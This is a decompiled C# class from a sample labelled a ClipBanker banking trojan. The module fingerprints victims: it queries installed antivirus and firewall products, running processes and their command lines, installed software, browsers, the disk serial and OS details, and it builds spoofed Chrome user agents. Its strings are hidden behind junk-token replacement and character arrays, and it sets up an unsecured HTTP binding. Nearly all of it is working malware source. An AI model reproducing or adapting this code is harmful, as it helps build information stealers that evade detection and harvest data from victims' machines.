// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Helpers.SystemInfoHelper
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Models.Info;
using FtpClient.Models.WMI;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.ServiceModel;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Xml;

namespace FtpClient.Data.Helpers
{
  public static class SystemInfoHelper
  {
    public static BasicHttpBinding CreateBind()
    {
      BasicHttpBinding bind = new BasicHttpBinding();
      bind.MaxBufferSize = int.MaxValue;
      bind.MaxReceivedMessageSize = (long) int.MaxValue;
      bind.MaxBufferPoolSize = (long) int.MaxValue;
      bind.CloseTimeout = TimeSpan.FromMinutes(30.0);
      bind.OpenTimeout = TimeSpan.FromMinutes(30.0);
      bind.ReceiveTimeout = TimeSpan.FromMinutes(30.0);
      bind.SendTimeout = TimeSpan.FromMinutes(30.0);
      bind.TransferMode = TransferMode.Buffered;
      bind.UseDefaultWebProxy = false;
      bind.ProxyAddress = (Uri) null;
      bind.ReaderQuotas = new XmlDictionaryReaderQuotas()
      {
        MaxDepth = 44567654,
        MaxArrayLength = int.MaxValue,
        MaxBytesPerRead = int.MaxValue,
        MaxNameTableCharCount = int.MaxValue,
        MaxStringContentLength = int.MaxValue
      };
      bind.Security = new BasicHttpSecurity()
      {
        Mode = BasicHttpSecurityMode.None
      };
      return bind;
    }

    private static bool Is64Bit() => Environment.Is64BitOperatingSystem;

    public static List<WmiProcessor> GetProcessors()
    {
      List<WmiProcessor> processors = new List<WmiProcessor>();
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementObject managementObject in objectCollection)
            {
              try
              {
                processors.Add(new WmiProcessor()
                {
                  Name = managementObject["Name"] as string,
                  NumberOfCores = new int?(Convert.ToInt32(managementObject["NumberOfCores"]))
                });
              }
              catch
              {
              }
            }
          }
        }
      }
      catch
      {
      }
      return processors;
    }

    public static List<WmiGraphicCard> GetGraphicCards()
    {
      List<WmiGraphicCard> graphicCards = new List<WmiGraphicCard>();
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementObject managementObject in objectCollection)
            {
              try
              {
                graphicCards.Add(new WmiGraphicCard()
                {
                  Name = managementObject["Name"] as string,
                  AdapterRAM = Convert.ToUInt32(managementObject["AdapterRAM"])
                });
              }
              catch
              {
              }
            }
          }
        }
      }
      catch (Exception ex)
      {
      }
      return graphicCards;
    }

    public static List<string> SystemDefenders()
    {
      List<string> stringList = new List<string>();
      try
      {
        string[] strArray1 = new string[2]
        {
          "ROUniversal uninstallerOT\\SecurityCenteUniversal uninstallerr2",
          "ROUniversal uninstallerOT\\SecurUniversal uninstallerityCenter"
        };
        string[] strArray2 = new string[3]
        {
          "AntiviruHuflepuffsProduct",
          "AntiSpHuflepuffyWareProHuflepuffuct",
          "FHuflepuffirewaHuflepuffllProduct"
        };
        foreach (string str1 in strArray2)
        {
          foreach (string str2 in strArray1)
          {
            try
            {
              using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(str2.Replace("Universal uninstaller", string.Empty), "SELECT * FROM " + str1.Replace("Huflepuff", string.Empty)))
              {
                using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
                {
                  foreach (ManagementObject managementObject in objectCollection)
                  {
                    try
                    {
                      if (!stringList.Contains(managementObject[new string(new char[11]
                      {
                        'd',
                        'i',
                        's',
                        'p',
                        'l',
                        'a',
                        'y',
                        'N',
                        'a',
                        'm',
                        'e'
                      })] as string))
                        stringList.Add(managementObject[new string(new char[11]
                        {
                          'd',
                          'i',
                          's',
                          'p',
                          'l',
                          'a',
                          'y',
                          'N',
                          'a',
                          'm',
                          'e'
                        })] as string);
                    }
                    catch
                    {
                    }
                  }
                }
              }
            }
            catch
            {
            }
          }
        }
      }
      catch (Exception ex)
      {
      }
      return stringList;
    }

    public static List<InfoClass5> GetBrowsers()
    {
      List<InfoClass5> browsers = new List<InfoClass5>();
      try
      {
        RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet") ?? Registry.LocalMachine.OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet");
        foreach (string subKeyName in registryKey1.GetSubKeyNames())
        {
          InfoClass5 infoClass5 = new InfoClass5();
          RegistryKey registryKey2 = registryKey1.OpenSubKey(subKeyName);
          infoClass5.Object1 = (string) registryKey2.GetValue((string) null);
          RegistryKey registryKey3 = registryKey2.OpenSubKey("shell\\open\\command");
          infoClass5.Object3 = registryKey3.GetValue((string) null).ToString().StripQuotes();
          infoClass5.Object2 = infoClass5.Object3 == null ? "Unknown Version" : FileVersionInfo.GetVersionInfo(infoClass5.Object3).FileVersion;
          browsers.Add(infoClass5);
        }
      }
      catch
      {
      }
      return browsers;
    }

    public static WmiDiskDrive GetDiskDrive()
    {
      WmiDiskDrive diskDrive = new WmiDiskDrive();
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive"))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementObject managementObject in objectCollection)
            {
              try
              {
                diskDrive.SerialNumber = managementObject["SerialNumber"] as string;
                break;
              }
              catch
              {
              }
            }
          }
        }
      }
      catch
      {
      }
      return diskDrive;
    }

    public static List<string> ListOfProcesses()
    {
      List<string> stringList = new List<string>();
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new string(new char[45]
        {
          'S',
          'E',
          'L',
          'E',
          'C',
          'T',
          ' ',
          '*',
          ' ',
          'F',
          'R',
          'O',
          'M',
          ' ',
          'W',
          'i',
          'n',
          '3',
          '2',
          '_',
          'P',
          'r',
          'o',
          'c',
          'e',
          's',
          's',
          ' ',
          'W',
          'h',
          'e',
          'r',
          'e',
          ' ',
          'S',
          'e',
          's',
          's',
          'i',
          'o',
          'n',
          'I',
          'd',
          '=',
          '\''
        }) + (object) Process.GetCurrentProcess().SessionId + "'"))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementObject managementObject in objectCollection)
            {
              try
              {
                stringList.Add(new string(new char[4]
                {
                  'I',
                  'D',
                  ':',
                  ' '
                }) + managementObject[new string(new char[9]
                {
                  'P',
                  'r',
                  'o',
                  'c',
                  'e',
                  's',
                  's',
                  'I',
                  'd'
                })]?.ToString() + new string(new char[8]
                {
                  ',',
                  ' ',
                  'N',
                  'a',
                  'm',
                  'e',
                  ':',
                  ' '
                }) + managementObject[new string(new char[4]
                {
                  'N',
                  'a',
                  'm',
                  'e'
                })]?.ToString() + new string(new char[15]
                {
                  ',',
                  ' ',
                  'C',
                  'o',
                  'm',
                  'm',
                  'a',
                  'n',
                  'd',
                  'L',
                  'i',
                  'n',
                  'e',
                  ':',
                  ' '
                }) + managementObject[new string(new char[11]
                {
                  'C',
                  'o',
                  'm',
                  'm',
                  'a',
                  'n',
                  'd',
                  'L',
                  'i',
                  'n',
                  'e'
                })]?.ToString());
              }
              catch
              {
              }
            }
          }
        }
      }
      catch
      {
      }
      return stringList;
    }

    public static List<string> ListOfPrograms()
    {
      List<string> source = new List<string>();
      try
      {
        string name = new string(new char[51]
        {
          'S',
          'O',
          'F',
          'T',
          'W',
          'A',
          'R',
          'E',
          '\\',
          'M',
          'i',
          'c',
          'r',
          'o',
          's',
          'o',
          'f',
          't',
          '\\',
          'W',
          'i',
          'n',
          'd',
          'o',
          'w',
          's',
          '\\',
          'C',
          'u',
          'r',
          'r',
          'e',
          'n',
          't',
          'V',
          'e',
          'r',
          's',
          'i',
          'o',
          'n',
          '\\',
          'U',
          'n',
          'i',
          'n',
          's',
          't',
          'a',
          'l',
          'l'
        });
        using (RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey(name))
        {
          foreach (string subKeyName in registryKey1.GetSubKeyNames())
          {
            using (RegistryKey registryKey2 = registryKey1.OpenSubKey(subKeyName))
            {
              object obj1;
              if (registryKey2 == null)
                obj1 = (object) null;
              else
                obj1 = registryKey2.GetValue(new string(new char[11]
                {
                  'D',
                  'i',
                  's',
                  'p',
                  'l',
                  'a',
                  'y',
                  'N',
                  'a',
                  'm',
                  'e'
                }));
              string str1 = (string) obj1;
              object obj2;
              if (registryKey2 == null)
                obj2 = (object) null;
              else
                obj2 = registryKey2.GetValue(new string(new char[14]
                {
                  'D',
                  'i',
                  's',
                  'p',
                  'l',
                  'a',
                  'y',
                  'V',
                  'e',
                  'r',
                  's',
                  'i',
                  'o',
                  'n'
                }));
              string str2 = (string) obj2;
              if (!string.IsNullOrEmpty(str1))
                source.Add(Regex.Replace(str1 + " [" + str2 + "]", new string(new char[16]
                {
                  '[',
                  '^',
                  '\\',
                  'u',
                  '0',
                  '0',
                  '2',
                  '0',
                  '-',
                  '\\',
                  'u',
                  '0',
                  '0',
                  '7',
                  'F',
                  ']'
                }), string.Empty));
            }
          }
        }
      }
      catch
      {
      }
      return source.OrderBy<string, string>((Func<string, string>) (x => x)).ToList<string>();
    }

    public static List<string> AvailableLanguages()
    {
      List<string> stringList = new List<string>();
      try
      {
        return InputLanguage.InstalledInputLanguages.Cast<InputLanguage>().Select<InputLanguage, string>((Func<InputLanguage, string>) (lang => lang.Culture.EnglishName)).ToList<string>();
      }
      catch
      {
      }
      return stringList;
    }

    public static List<string> GetUserAgents(InfoClass10 settings)
    {
      List<string> userAgents = new List<string>();
      try
      {
        if (!settings.Object6)
          return userAgents;
        string str1 = SystemInfoHelper.Is64Bit() ? "x64" : "x32";
        string osVersion = SystemInfoHelper.GetOsVersion();
        string empty1 = string.Empty;
        string[] source = osVersion.Split('.');
        string str2 = string.Empty;
        if (((IEnumerable<string>) source).Contains<string>("10"))
          str2 = new string(new char[10]
          {
            'W',
            'i',
            'n',
            'd',
            'o',
            'w',
            's',
            ' ',
            'N',
            'T'
          }) + " 10.0";
        if (source.Length > 1 && !((IEnumerable<string>) source).Contains<string>("10"))
          str2 = new string(new char[10]
          {
            'W',
            'i',
            'n',
            'd',
            'o',
            'w',
            's',
            ' ',
            'N',
            'T'
          }) + " " + source[0] + "." + source[1];
        if (Directory.Exists(Environment.GetEnvironmentVariable(new string(new char[12]
        {
          'L',
          'o',
          'c',
          'a',
          'l',
          'A',
          'p',
          'p',
          'D',
          'a',
          't',
          'a'
        })) + new string(new char[24]
        {
          '\\',
          'G',
          'o',
          'o',
          'g',
          'l',
          'e',
          '\\',
          'C',
          'h',
          'r',
          'o',
          'm',
          'e',
          '\\',
          'U',
          's',
          'e',
          'r',
          ' ',
          'D',
          'a',
          't',
          'a'
        })))
        {
          object obj1 = Registry.GetValue(new string(new char[80]
          {
            'H',
            'K',
            'E',
            'Y',
            '_',
            'C',
            'U',
            'R',
            'R',
            'E',
            'N',
            'T',
            '_',
            'U',
            'S',
            'E',
            'R',
            '\\',
            'S',
            'o',
            'f',
            't',
            'w',
            'a',
            'r',
            'e',
            '\\',
            'M',
            'i',
            'c',
            'r',
            'o',
            's',
            'o',
            'f',
            't',
            '\\',
            'W',
            'i',
            'n',
            'd',
            'o',
            'w',
            's',
            '\\',
            'C',
            'u',
            'r',
            'r',
            'e',
            'n',
            't',
            'V',
            'e',
            'r',
            's',
            'i',
            'o',
            'n',
            '\\',
            'A',
            'p',
            'p',
            ' ',
            'P',
            'a',
            't',
            'h',
            's',
            '\\',
            'c',
            'h',
            'r',
            'o',
            'm',
            'e',
            '.',
            'e',
            'x',
            'e'
          }), "", (object) null);
          string empty2 = string.Empty;
          object obj2 = Registry.GetValue("HKEY_LOCAL_MACf4f42dHINE\\SOFTWf4f42dARE\\Microf4f42dsoft\\Wf4f42dindows\\CurrentVef4f42drsion\\App f4f42dPaths\\chromf4f42de.exe".Replace("f4f42d", string.Empty), "", (object) null);
          string str3 = obj1 == null ? FileVersionInfo.GetVersionInfo(obj2.ToString()).FileVersion : FileVersionInfo.GetVersionInfo(obj1.ToString()).FileVersion;
          if (str1 == new string(new char[3]
          {
            'x',
            '6',
            '4'
          }))
            userAgents.Add(new string(new char[13]
            {
              'M',
              'o',
              'z',
              'i',
              'l',
              'l',
              'a',
              '/',
              '5',
              '.',
              '0',
              ' ',
              '('
            }) + str2 + new string(new char[60]
            {
              ';',
              ' ',
              'W',
              'i',
              'n',
              '6',
              '4',
              ';',
              ' ',
              'x',
              '6',
              '4',
              ')',
              ' ',
              'A',
              'p',
              'p',
              'l',
              'e',
              'W',
              'e',
              'b',
              'K',
              'i',
              't',
              '/',
              '5',
              '3',
              '7',
              '.',
              '3',
              '6',
              ' ',
              '(',
              'K',
              'H',
              'T',
              'M',
              'L',
              ',',
              ' ',
              'l',
              'i',
              'k',
              'e',
              ' ',
              'G',
              'e',
              'c',
              'k',
              'o',
              ')',
              ' ',
              'C',
              'h',
              'r',
              'o',
              'm',
              'e',
              '/'
            }) + str3 + new string(new char[14]
            {
              ' ',
              'S',
              'a',
              'f',
              'a',
              'r',
              'i',
              '/',
              '5',
              '3',
              '7',
              '.',
              '3',
              '6'
            }));
          else
            userAgents.Add(new string(new char[13]
            {
              'M',
              'o',
              'z',
              'i',
              'l',
              'l',
              'a',
              '/',
              '5',
              '.',
              '0',
              ' ',
              '('
            }) + str2 + new string(new char[48]
            {
              ')',
              ' ',
              'A',
              'p',
              'p',
              'l',
              'e',
              'W',
              'e',
              'b',
              'K',
              'i',
              't',
              '/',
              '5',
              '3',
              '7',
              '.',
              '3',
              '6',
              ' ',
              '(',
              'K',
              'H',
              'T',
              'M',
              'L',
              ',',
              ' ',
              'l',
              'i',
              'k',
              'e',
              ' ',
              'G',
              'e',
              'c',
              'k',
              'o',
              ')',
              ' ',
              'C',
              'h',
              'r',
              'o',
              'm',
              'e',
              '/'
            }) + str3 + new string(new char[14]
            {
              ' ',
              'S',
              'a',
              'f',
              'a',
              'r',
              'i',
              '/',
              '5',
              '3',
              '7',
              '.',
              '3',
              '6'
            }));
        }
      }
      catch
      {
      }
      return userAgents;
    }

    public static string TotalOfRAM()
    {
      string str = "0 Mb or 0";
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementObject managementObject in objectCollection)
            {
              try
              {
                double num1 = Convert.ToDouble(managementObject["TotalVisibleMemorySize"]);
                double num2 = num1 * 1024.0;
                str = string.Format("{0} MB or {1}", (object) Math.Round(num1 / 1024.0, 2), (object) num2).Replace(",", ".");
              }
              catch
              {
              }
            }
          }
        }
      }
      catch
      {
      }
      return str;
    }

    public static string GetWindowsVersion()
    {
      try
      {
        string str1;
        try
        {
          str1 = Environment.Is64BitOperatingSystem ? "x64" : "x32";
        }
        catch (Exception ex)
        {
          str1 = "x86";
        }
        string str2 = HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
        HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CSDVersion");
        if (!string.IsNullOrEmpty(str2))
          return str2 + " " + str1;
      }
      catch
      {
      }
      return string.Empty;

      static string HKLM_GetString(string key, string value)
      {
        try
        {
          return Registry.LocalMachine.OpenSubKey(key)?.GetValue(value).ToString() ?? string.Empty;
        }
        catch
        {
          return string.Empty;
        }
      }
    }

    public static string GetOsVersion()
    {
      string empty = string.Empty;
      try
      {
        ManagementObject managementObject = (ManagementObject) null;
        foreach (ManagementObject instance in new ManagementClass(new string(new char[21]
        {
          'W',
          'i',
          'n',
          '3',
          '2',
          '_',
          'O',
          'p',
          'e',
          'r',
          'a',
          't',
          'i',
          'n',
          'g',
          'S',
          'y',
          's',
          't',
          'e',
          'm'
        })).GetInstances())
        {
          managementObject = instance;
          if (managementObject != null)
            break;
        }
        if (managementObject == null)
          empty = string.Empty;
        else
          empty = managementObject[new string(new char[7]
          {
            'V',
            'e',
            'r',
            's',
            'i',
            'o',
            'n'
          })] as string;
      }
      catch
      {
      }
      return empty;
    }
  }
}
